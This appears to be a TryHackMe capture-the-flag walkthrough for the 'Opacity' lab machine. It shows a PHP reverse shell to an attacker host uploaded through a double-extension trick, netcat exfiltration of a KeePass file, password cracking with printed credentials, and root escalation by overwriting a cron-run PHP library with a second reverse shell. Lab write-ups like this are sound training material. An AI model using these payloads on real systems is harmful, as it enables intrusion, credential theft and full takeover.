---
tags:
  - THM
  - Linux
  - Easy
  - File-Upload
  - RCE
  - KeePass
  - Cron
  - Lib-HJ
---
https://tryhackme.com/room/opacity/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.42.47 opacity.thm
```
# Scanning
```console
$ nmap -p22,80,139,445 -sV -sC opacity.thm

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 89:ef:69:e5:ec:08:22:d4:9d:5b:e0:e4:4b:34:e9:82 (RSA)
|   256 0a:26:94:ac:16:11:59:ea:d9:49:41:c3:ff:aa:9a:c3 (ECDSA)
|_  256 66:ae:d5:e9:44:3f:af:15:ed:d1:ea:4a:b3:05:aa:d6 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-06-11T02:19:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```
# Enumeration
Found `/cloud` directory, which is a **5-minute image cloud storage** website:
```console
$ gobuster dir -q -r -u http://opacity.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

/cloud                (Status: 200) [Size: 639]
```
# Exploitation
Create a malicious `file.php`:
```php
<?php shell_exec("bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'"); ?>
```
Start a Python server:
```bash
python3 -m http.server 8000
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Submit the next [double extension URL](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html) to upload the reverse shell file:
```text
http://<ATTACKER-IP>:8000/file.php#.png
```
Now, load the `file.php` file from the server.
# Post-Exploitation
## KeePass Credentials
Found **sysadmin user**:
```console
$ whoami
www-data

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```
Found a readable **KeePass password database file** using [LinPEAS](https://github.com/peass-ng/PEASS-ng/releases):
```console
$ ls -l /opt/dataset.kdbx

-rwxrwxr-x 1 sysadmin sysadmin 1566 Jul  8  2022 /opt/dataset.kdbx
```
Wait to receive the **KeePass file** in the attacker's machine:
```bash
nc -lvnp <PORT> > dataset.kdbx
```
Send the **KeePass file**:
```bash
nc <ATTACKER-IP> <PORT> < /opt/dataset.kdbx
```
Crack the **KeePass file password**:
```console
$ keepassxc-cli ls dataset.kdbx
Enter password to unlock dataset.kdbx:^C

$ keepass2john dataset.kdbx > dataset.hash

$ john --wordlist=/usr/share/dict/rockyou.txt dataset.hash
741852963        (dataset)
```
Get **sysadmin password**:
```console
$ keepassxc-cli ls dataset.kdbx <<< '741852963'
Enter password to unlock dataset.kdbx: 
user:password

$ keepassxc-cli show -s dataset.kdbx 'user:password' <<< '741852963'
Enter password to unlock dataset.kdbx: 
Title: user:password
UserName: sysadmin
Password: Cl0udP4ss40p4city#8700
URL: 
Notes: 
Uuid: {c116cbb5-f7c3-9a74-04c2-75019b28cc51}
Tags:
```
## Scheduled Script
Connect as **sysadmin** via SSH:
```bash
sshpass -p 'Cl0udP4ss40p4city#8700' ssh -o StrictHostKeyChecking=no sysadmin@opacity.thm
```
Get **user flag**:
```bash
cat /home/sysadmin/local.txt
```
The PHP script `/home/sysadmin/scripts/script.php` cleans the **website's cloud storage**:
```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```
The script is run by **root**, so if we abuse it, we get maximum privileges:
```console
$ ls -l /var/backups/backup.zip

-rw-r--r-- 1 root root 33987 Jun 17 19:47 /var/backups/backup.zip
```
The script needs the `lib/backup.inc.php` **library**, which we can not modify directly, but we can overwrite:
```console
$ ls -l /home/sysadmin/scripts/lib/backup.inc.php
rw-r--r-- 1 root root 967 Jul  6  2022 /home/sysadmin/scripts/lib/backup.inc.php

$ ls -l /home/sysadmin/scripts/
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```
Overwrite the **library** to contain a reverse shell:
```console
$ echo '<?php $sock=fsockopen("<ATTACKER-IP>",<PORT>);shell_exec("sh <&3 >&3 2>&3"); ?>' > /tmp/backup.inc.php

$ mv -f /tmp/backup.inc.php /home/sysadmin/scripts/lib/
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Get the **root flag**:
```bash
cat /root/proof.txt
```